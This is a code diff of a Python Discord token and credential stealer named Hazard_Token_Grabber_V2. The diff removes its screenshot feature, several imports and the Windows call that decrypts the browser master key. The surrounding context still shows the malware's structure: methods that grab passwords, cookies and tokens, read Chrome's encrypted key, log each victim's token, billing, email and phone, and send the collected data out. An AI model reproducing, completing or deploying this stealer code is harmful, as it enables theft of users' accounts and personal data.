@@ -5,12 +5,8 @@ import sqlite3
 import zipfile 
 import json 
 import base64 
-import psutil 
-import pyautogui
 
-from win32crypt import CryptUnprotectData
 from re import findall
-from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
@@ -37,7 +33,6 @@ class Hazard_Token_Grabber_V2:
             self.grabPassword()
             self.grabCookies()
         self.grabTokens()
-        self.screenshot()
         self.SendInfo()
         self.LogOut()
         try:
@@ -90,7 +85,6 @@ class Hazard_Token_Grabber_V2:
         local_state = json.loads(local_state)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
     def decrypt_payload(self, cipher, payload):
@@ -258,10 +252,6 @@ class Hazard_Token_Grabber_V2:
                 
                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
         f.close()
-
-    def screenshot(self):
-        image = pyautogui.screenshot()
-        image.save(self.tempfolder + "\\Screenshot.png")
 
     def SendInfo(self):
         try:
